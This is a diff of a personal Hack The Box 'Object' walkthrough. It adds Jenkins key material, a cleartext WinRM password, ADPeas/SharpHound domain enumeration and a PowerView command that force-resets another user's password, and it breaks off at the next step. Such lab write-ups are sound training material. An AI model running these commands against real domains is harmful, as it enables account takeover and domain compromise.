@@ -4,7 +4,7 @@ description: 10-21-2022
 
 # Object (Hard)
 
-<figure><img src="../../../.gitbook/assets/image.png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (2).png" alt=""><figcaption></figcaption></figure>
 
 ## Information Gathering
 
@@ -123,7 +123,7 @@ Target: http://10.129.96.147:8080/
 * I attempted to access the Groovy script section of Jenkins but I do not have the correct permissions to access
   * This can be attempted by going to <mark style="color:yellow;">/script</mark>
 
-<figure><img src="../../../.gitbook/assets/image (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 * We notice that <mark style="color:yellow;">Jenkins</mark> is running version <mark style="color:yellow;">2.317</mark>
 
@@ -175,16 +175,139 @@ TCPDump output (Receiving ICMP traffic from the target):
 
 {% embed url="https://github.com/hoto/jenkins-credentials-decryptor" %}
 
+You need three files for this tool to work:
+
+* master.key
+
+```
+f673fdb0c4fcc339070435bdbe1a039d83a597bf21eafbb7f9b35b50fce006e564cff456553ed73cb1fa568b68b310addc576f1637a7fe73414a4c6ff10b4e23adc538e9b369a0c6de8fc299dfa2a3904ec73a24aa48550b276be51f9165679595b2cac03cc2044f3c702d677169e2f4d3bd96d8321a2e19e2bf0c76fe31db19
+```
+
+* hudson.util.Secret
+
+```
+gWFQFlTxi+xRdwcz6KgADwG+rsOAg2e3omR3LUopDXUcTQaGCJIswWKIbqgNXAvu2SHL93OiRbnEMeKqYe07PqnX9VWLh77Vtf+Z3jgJ7sa9v3hkJLPMWVUKqWsaMRHOkX30Qfa73XaWhe0ShIGsqROVDA1gS50ToDgNRIEXYRQWSeJY0gZELcUFIrS+r+2LAORHdFzxUeVfXcaalJ3HBhI+Si+pq85MKCcY3uxVpxSgnUrMB5MX4a18UrQ3iug9GHZQN4g6iETVf3u6FBFLSTiyxJ77IVWB1xgep5P66lgfEsqgUL9miuFFBzTsAkzcpBZeiPbwhyrhy/mCWogCddKudAJkHMqEISA3et9RIgA=
+```
+
+* credentials.xml
+
 ### Evil-WinRM FTW
 
 ```
 evil-winrm -i object.htb -u oliver
-Password: 
+Password: c1cdfun_d2434
 ```
 
 ## Privilege Escalation
 
 ### Local enumeration
+
+File Transfer tools to aid in Priv Esc: <mark style="color:yellow;">I had to use the upload/download feature in Evil-WinRM (very clunky</mark>)
+
+* Did ADpeas.ps1
+
+```
+Import-Module .\ADPeas.ps1
+
+Invoke-ADPeas
+```
+
+Domain Controller Enumeration:
+
+```
+[*] +++++ Searching Domain Controllers +++++
+Searching for Domain Controllers - Details for Computer 'JENKINS$':
+sAMAccountName     : JENKINS$
+dNSHostName        : jenkins.object.local
+distinguishedName  : CN=JENKINS,OU=Domain Controllers,DC=object,DC=local
+IPv4Address        : 10.129.103.255
+operatingSystem    : Windows Server 2019 Standard
+description        :
+objectSid          : S-1-5-21-4088429403-1159899800-2753317549-1000
+userAccountControl : SERVER_TRUST_ACCOUNT, TRUSTED_FOR_DELEGATION
+```
+
+* Transferred SharpHound.exe collector for BloodHound
+
+Syntax for SharpHound.exe:
+
+```
+.\SharpHound.exe -c all -d object.local
+```
+
+* I had to utilize the legitimate domain name as object.htb is not the domain name, object.local is&#x20;
+
+Transferring collector information to Kali:
+
+* I tried numerous ways but the only way that worked turned out to be very weird, but I'm not questioning it if it worked
+
+```
+download C:\Users\oliver\Desktop\20221022065030_BloodHound.zip
+```
+
+Placed it into BloodHound and examined the information:
+
+### BloodHound Queries
+
+**Shortest Paths to High Value Targets:**
+
+<figure><img src="../../../.gitbook/assets/image.png" alt=""><figcaption></figcaption></figure>
+
+* Set <mark style="color:yellow;">Oliver</mark> user as <mark style="color:yellow;">owned</mark>
+* This is a messy output -- can we simplify with another query?
+
+**Shortest Paths to Domain Admins:**
+
+<figure><img src="../../../.gitbook/assets/image (8).png" alt=""><figcaption></figcaption></figure>
+
+* So, here is what I am thinking at this point
+
+<mark style="color:yellow;">Oliver (ForceChangePassword) -> Smith (GenericWrite) -> Maria (WriteOwner) -> Domain Admins Group</mark>
+
+* We need to transfer <mark style="color:yellow;">PowerView</mark> first
+
+### Exploitation Attempt Overview
+
+* Oliver has the ability to change Smith's password without knowing it (ForceChangePassword)
+* Smith has GenericWrite access to Maria
+  * This means that you can write to a non-protected attribute on the target object
+* Maria has the ability to modify the owner of the group DOMAIN ADMINS
+
+### PowerView
+
+* Transferred PowerView with Evil-WinRM
+
+Imported Module:&#x20;
+
+```
+Import-Module .\PowerView.ps1
+```
+
+{% embed url="https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/acl-persistence-abuse" %}
+
+Step 1: <mark style="color:red;">ForceChangePassword Oliver -> Smith</mark>
+
+```
+Set-DomainUserPassword -Identity smith -AccountPassword (ConvertTo-SecureString 'Password1' -AsPlainText -Force) -Verbose
+
+Verbose: [Set-DomainUserPassword] Attempting to set the password for user 'smith'
+Verbose: [Set-DomainUserPassword] Password for user 'smith' successfully reset
+```
+
+* <mark style="color:yellow;">Smith's password was changed to Password1</mark>
+* I can now Evil-WinRM into Smith
+
+Authenticating:
+
+```
+evil-winrm -i object.htb -u smith
+```
+
+<figure><img src="../../../.gitbook/assets/image (3).png" alt=""><figcaption></figcaption></figure>
+
+Step 2: <mark style="color:red;">GenericWrite Smith -> Maria</mark>
+
+
 
 ### PrivEsc vector
 
